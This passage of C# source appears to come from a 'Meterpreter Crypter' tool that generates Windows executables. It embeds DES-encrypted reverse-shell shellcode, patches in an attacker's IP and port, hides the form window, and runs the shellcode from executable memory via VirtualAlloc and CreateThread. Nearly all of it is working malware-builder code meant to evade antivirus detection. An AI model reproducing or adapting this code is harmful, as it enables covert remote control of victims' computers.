WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptDesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_reverse_shell_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_shell_des.exe", compiler.isCreated);
        }
        public void SaveReverseShellDes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; } } else { shellCodePacket[7] = port1Byte; shellCodePacket[8] = Convert.ToByte(inputPort); } string shellCodeRaw = \"4uYpbVFme1p22FIRO7uPcWtpQ8U53JNgFavqv8nl9TSgX5bE3FJTd3gvaIKtg5E0w0+Vle2+yvDbbsugcbAdrgHhfvH7teJJakBcuU4BwKBSqyvhf6atbDgT+Ta2Y8zljOfozgeEYyvbVJ6HAMst7F0KIxmbK0sUSdVxoRfrJk/aBvskxHChGHHkOcrR0I2Wuk2fbwx/ajBXDYx3mJh2B++5RdPwq38MlVCkNUoAP4b+MAsYCkHCNWRpiRqnWS0sgDFl90RHsHOmOkVwO4QB3bstgw/58gta1Fh5/7Pn2xOqzFS/j6OU473GrAatGw57F0jEZzU1fFht49VaT4TEY/O8f1nIh+S/oNDkZkKg6aUn8uODn7lsuO4bRHWiBooyjLuwLvPqEzGHHb1uK1s/nnLNSC1YGq2zV/GxhAP81rsNw38aF47+w3p0oDOJpsXx63jmhyvyKPpq3GBRsUkJZqmI+is+4CMph0JCuZGXb4OVmIRCZwuLl5CGLkyQrPLcvTmSi0FXpvXUPNCEff+Dd2bJdma2ixBRwvijNMjN7tbagYSq4qyqJ14LirTRTJPFirM8jKvwukmopYdli2q3ww==\"; string s3 = Convert.ToBase64String(shellCodePacket); Encrypter encrypter = new Encrypter(); string shellCodeDecrypt = encrypter.DecryptDes(shellCodeRaw, \"?(#(?5:3\"); string newShellCode = shellCodeDecrypt.Replace(\"wKgYgGgCABFc\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptDesCsharpString() + " } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_reverse_shell_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_shell_des.exe", compiler.isCreated);
        }
        public static string RandomFileName(int start, int end)
        {
            var rnd = new Random();
            var chr = "0123456789abcdefghijklmnoprstuvwxyz".ToCharArray();
            var randomFName = string.Empty;
            for (var i = start; i < end; i++)
            {
                randomFName += chr[rnd.Next(0, chr.Length - 1)].ToString();
            }
            return randomFName;
        }
        private void ReturnMessageBox(string fileName, bool isCreated)
        {
            if (isCreated == true)
            {
                FileName = fileName;
                MessageBox.Show(@"File Created!" + Environment.NewLine + fileName,
                    @"MFUD - Meterpreter Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show(@"File can not be created", @"MFUD - Meterpreter Crypter", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
